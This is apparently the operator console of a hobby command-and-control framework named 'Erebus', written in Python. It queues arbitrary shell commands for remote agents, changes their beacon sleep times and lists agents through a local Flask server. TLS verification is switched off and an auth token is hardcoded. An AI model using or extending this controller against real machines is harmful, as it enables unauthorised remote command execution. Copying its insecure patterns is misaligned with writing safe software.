import json

import server_controlling
import random
import shared
import server
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print(""" 
command 
███████╗██████╗ ███████╗██████╗ ██╗   ██╗███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝
█████╗  ██████╔╝█████╗  ██████╔╝██║   ██║███████╗
██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗██║   ██║╚════██║
███████╗██║  ██║███████╗██████╔╝╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝
                    C 2  F R A M E W O R K \n

""")

sleep = 30
uuid = ""
while True:
    user_input = input("command>:")

    if user_input.lower() == "help":
        print(""" 
          
          start (Start FLask Server)
          stop (Stop Flask Server)
          command (Send Command to the Agent)
          sleep (Change Sleep of Agent)
          list (list active Agents)
          exit (Exit the program)
          """)
    elif user_input.lower() == "exit":
        break

    elif user_input.lower() == "start":
        server_controlling.start()

    elif user_input.lower() == "stop":
        server_controlling.stop()

    elif user_input.lower() == "command":
        command = input("Which cmd should be executed: ")
        shared.set_command(command, uuid, sleep)

    elif user_input.lower() == "command_output":
        agent_uuid = input("Enter Agent UUID: ")
        response = requests.get(
            url=f"https://127.0.0.1:5000/agent/{agent_uuid}/output",
            verify=False
        )
        print(response.text)

    elif user_input.lower() == "list":
        response = requests.get("https://127.0.0.1:5000/agent/list", headers={'X-Auth-ID': 'MyErebusToken'}, verify=False)

        data = json.loads( response.text)

        for key, value in data.items():
            print(f"{key}: {value}")

    elif user_input.lower() == "sleep":
        sleep = input("Sleep Time: ")

    elif user_input.lower() == "use agent":
        uuid = input("Enter Agent UUID: ")

    else:
        print("Command not recognized")



